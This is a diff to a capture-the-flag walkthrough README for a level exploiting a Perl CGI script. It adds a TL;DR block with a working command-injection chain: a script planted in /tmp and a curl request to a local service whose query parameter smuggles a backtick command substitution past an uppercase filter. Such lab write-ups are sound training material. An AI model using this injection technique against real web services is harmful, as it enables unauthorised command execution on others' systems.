@@ -8,6 +8,21 @@
 <br>
 
 
+## TL;DR:
+
+```bash
+echo -e '#!/bin/bash\ngetflag > /tmp/flag && chmod 777 /tmp/flag' > /tmp/SCRIPT
+chmod 777 /tmp/SCRIPT
+curl 'localhost:4646?x=`/*/SCRIPT`&y=whatever'
+cat /tmp/flag
+```
+
+<br>
+
+
+## Explanation:
+
+
 #### Step 1:
 
 - What's in the home directory:
@@ -91,7 +106,8 @@ cat level12.pl
 
 - Let's make a little script to get the flag. It should be in uppercase because of the `tr/a-z/A-Z/` command.
 ```bash
-	echo -e '#!/bin/bash\ngetflag > /tmp/flag && chmod 777 /tmp/flag' > /tmp/SCRIPT && chmod 777 /tmp/SCRIPT
+echo -e '#!/bin/bash\ngetflag > /tmp/flag && chmod 777 /tmp/flag' > /tmp/SCRIPT
+chmod 777 /tmp/SCRIPT
 ```
 
 > To make it work, the final command that is executed should look like this:
@@ -117,4 +133,4 @@ cat /tmp/flag
 
 ---
 
-[<<](/level11/resources/Readme.md) &nbsp; [[Back to main page]](/) &nbsp; [>>](/level13/resources/Readme.md)
+[<<](/level11/resources/Readme.md) &nbsp; [[Back to main page]](/Readme.md) &nbsp; [>>](/level13/resources/Readme.md)
